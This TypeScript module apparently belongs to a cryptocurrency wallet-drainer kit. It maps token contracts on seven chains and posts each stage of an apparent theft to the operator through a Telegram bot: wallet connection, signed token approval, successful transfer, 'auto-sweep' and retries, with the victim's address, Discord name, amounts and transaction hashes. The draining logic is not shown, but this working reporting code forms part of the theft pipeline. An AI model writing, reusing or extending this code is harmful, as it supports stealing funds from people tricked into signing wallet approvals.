const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramMessage(text: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("[Telegram] Bot token or chat ID not configured, skipping notification");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const err = await response.text();
      console.error("[Telegram] Failed to send message:", err);
      return false;
    }

    return true;
  } catch (error: any) {
    console.error("[Telegram] Error sending message:", error?.message);
    return false;
  }
}

const TOKEN_ADDRESS_MAP: Record<string, string> = {
  // Ethereum
  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDC",
  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAI",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTC",
  "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": "WETH",
  // BSC
  "0x55d398326f99059ff775485246999027b3197955": "USDT",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": "USDC",
  "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3": "DAI",
  "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c": "WBTC",
  "0x2170ed0880ac9a755fd29b2688956bd959f933f8": "WETH",
  // Polygon
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDT",
  "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359": "USDC",
  "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063": "DAI",
  "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6": "WBTC",
  "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619": "WETH",
  // Arbitrum
  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
  "0xaf88d065e77c8cc2239327c5edb3a432268e5831": "USDC",
  "0xda10009cbd5d07dd0cecc66161fc93d7c9000da1": "DAI",
  "0x2f2a2543b76a4166549f7aab2e75bef0aefc5b0f": "WBTC",
  "0x82af49447d8a07e3bd95bd0d56f35241523fbab1": "WETH",
  // Optimism
  "0x94b008aa00579c1307b0ef2c499ad98a8ce58e58": "USDT",
  "0x0b2c639c533813f4aa9d7837caf62653d097ff85": "USDC",
  "0x68f180fcce6836688e9084f035309e29bf0a2095": "WBTC",
  "0x4200000000000000000000000000000000000006": "WETH",
  // Avalanche
  "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7": "USDT",
  "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e": "USDC",
  "0xd586e7f844cea2f87f50152665bcbc2c279d8d70": "DAI",
  "0x50b7545627a5162f82a992c33b87adc75187b218": "WBTC",
  "0x49d5c2bdffac6ce2bfdb6640f4f80f226bc10bab": "WETH",
  // Base
  "0xfde4c96c8593536e31f229ea8f37b2ada2699bb2": "USDT",
  "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913": "USDC",
  "0x50c5725949a6f0c72e6c4a641f24049a917db0cb": "DAI",
  "0x0555e30da8f98308edb960aa94c0db47230d2b9c": "WBTC",
  // Shared addresses (Optimism/Base WETH uses same address)
  // 0x4200000000000000000000000000000000000006 already mapped above as WETH
};

export function resolveTokenSymbol(tokenAddress: string): string {
  return TOKEN_ADDRESS_MAP[tokenAddress.toLowerCase()] || tokenAddress.slice(0, 10);
}

function shortenAddress(addr: string): string {
  if (!addr) return "Unknown";
  if (addr.length <= 12) return addr;
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function getChainName(chainId: string | number): string {
  const chains: Record<string, string> = {
    "1": "Ethereum",
    "56": "BSC",
    "137": "Polygon",
    "42161": "Arbitrum",
    "10": "Optimism",
    "43114": "Avalanche",
    "8453": "Base",
  };
  return chains[String(chainId)] || `Chain ${chainId}`;
}

export async function notifyWalletConnected(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Wallet Connected</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}`;

  await sendTelegramMessage(msg);
}

export async function notifyWalletSigned(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  tokens: string[];
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, tokens, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Wallet Signed (Approval)</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Tokens:</b> ${tokens.join(", ")}`;

  await sendTelegramMessage(msg);
}

export async function notifyTransferSuccess(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  token: string;
  amount: string;
  txHash: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, token, amount, txHash, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Transfer Successful</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Token:</b> ${token}\n` +
    `<b>Amount:</b> ${amount}\n` +
    `<b>TX:</b> <code>${txHash}</code>`;

  await sendTelegramMessage(msg);
}

export async function notifyTransferFailed(params: {
  walletAddress: string;
  network: string;
  chainId?: string;
  error: string;
  discordUser?: string;
}) {
  const { walletAddress, network, chainId, error, discordUser } = params;
  const chain = network === "solana" ? "Solana" : getChainName(chainId || "1");
  const user = discordUser || "Unknown";

  const msg =
    `<b>Transfer Failed</b>\n` +
    `<b>User:</b> ${user}\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Error:</b> ${error}`;

  await sendTelegramMessage(msg);
}

export async function notifySweepSuccess(params: {
  walletAddress: string;
  network: string;
  token: string;
  amount: string;
  txHash: string;
}) {
  const { walletAddress, network, token, amount, txHash } = params;
  const chain = network === "solana" ? "Solana" : "EVM";

  const msg =
    `<b>Auto-Sweep Successful</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Token:</b> ${token}\n` +
    `<b>Amount:</b> ${amount}\n` +
    `<b>TX:</b> <code>${txHash}</code>`;

  await sendTelegramMessage(msg);
}

export async function notifyRetrySuccess(params: {
  walletAddress: string;
  chainId: string;
  txHash: string;
  attempt: number;
  tokens: { token: string; amount: string }[];
}) {
  const { walletAddress, chainId, txHash, attempt, tokens } = params;
  const chain = getChainName(chainId);
  const tokenList = tokens.map(t => `${t.token}: ${t.amount}`).join("\n");

  const msg =
    `<b>Retry Transfer Successful</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Attempt:</b> #${attempt}\n` +
    `<b>TX:</b> <code>${txHash}</code>\n` +
    `<b>Tokens:</b>\n${tokenList}`;

  await sendTelegramMessage(msg);
}

export async function notifyRetryFailed(params: {
  walletAddress: string;
  chainId: string;
  attempt: number;
  error: string;
  maxRetriesExceeded?: boolean;
}) {
  const { walletAddress, chainId, attempt, error, maxRetriesExceeded } = params;
  const chain = getChainName(chainId);
  const status = maxRetriesExceeded ? "MAX RETRIES EXCEEDED" : "Retry Failed";

  const msg =
    `<b>${status}</b>\n` +
    `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
    `<b>Network:</b> ${chain}\n` +
    `<b>Attempt:</b> #${attempt}\n` +
    `<b>Error:</b> ${error}`;

  await sendTelegramMessage(msg);
}
